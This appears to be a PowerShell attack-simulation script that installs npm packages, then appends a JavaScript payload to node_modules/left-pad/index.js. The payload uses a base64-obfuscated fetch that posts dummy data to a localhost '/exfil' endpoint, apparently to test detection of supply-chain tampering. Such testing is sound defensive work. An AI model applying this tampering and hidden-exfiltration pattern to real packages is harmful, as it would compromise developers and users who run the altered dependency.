#Requires -Version 5.1
<#
.SYNOPSIS
    Scenario 4: Package File Patching Simulation
.DESCRIPTION
    Patches a legitimate package file with malicious code during installation
#>

Write-Host "Scenario 4: Package File Patching Simulation" -ForegroundColor Yellow

# Initialize npm project
try {
    npm init -y 2>$null | Out-Null
    Write-Host "Initialized npm project" -ForegroundColor Cyan
}
catch {
    Write-Host "npm init failed" -ForegroundColor Yellow
}

# Install a legitimate package to ensure node_modules exists
try {
    Write-Host "Installing ethers package..." -ForegroundColor Cyan
    npm install ethers 2>$null | Out-Null
    Write-Host "ethers package installed" -ForegroundColor Green
}
catch {
    Write-Host "Failed to install ethers package" -ForegroundColor Yellow
}

# Start background install of left-pad
$installJob = Start-Job -ScriptBlock {
    try {
        npm install --no-save left-pad@1.3.0 2>$null
    }
    catch {
        # Expected behavior
    }
}

# Target file to patch
$targetPath = "node_modules\left-pad\index.js"

# Wait for the file to appear
Write-Host "Waiting for target file to appear..." -ForegroundColor Cyan
$maxAttempts = 20
$attempt = 0

while ($attempt -lt $maxAttempts -and -not (Test-Path $targetPath)) {
    Start-Sleep -Milliseconds 200
    $attempt++
}

if (Test-Path $targetPath) {
    Write-Host "Target file found: $targetPath" -ForegroundColor Green
    
    # Backup original file
    $backupPath = "$targetPath.backup"
    Copy-Item $targetPath $backupPath -Force
    Write-Host "Created backup: $backupPath" -ForegroundColor Gray
    
    # Append malicious code
    $maliciousCode = @'

// Malicious code injection simulation
function __maliciousPayload__() {
  const encoded = "aHR0cDovL2xvY2FsaG9zdDo4MDgw"; // base64 for localhost:8080
  try {
    fetch(atob(encoded) + "/exfil", { method: "POST", body: "test=patched" });
  } catch (e) {}
}
__maliciousPayload__();
'@
    
    Add-Content -Path $targetPath -Value $maliciousCode -Encoding UTF8
    Write-Host "Malicious code injected into $targetPath" -ForegroundColor Red
    Write-Host "Code attempts to exfiltrate data via fetch() call" -ForegroundColor Gray
} else {
    Write-Host "Target file not found after waiting" -ForegroundColor Yellow
}

# Clean up background job
$installJob | Stop-Job -PassThru | Remove-Job -Force

Write-Host "Scenario 4 complete" -ForegroundColor Green
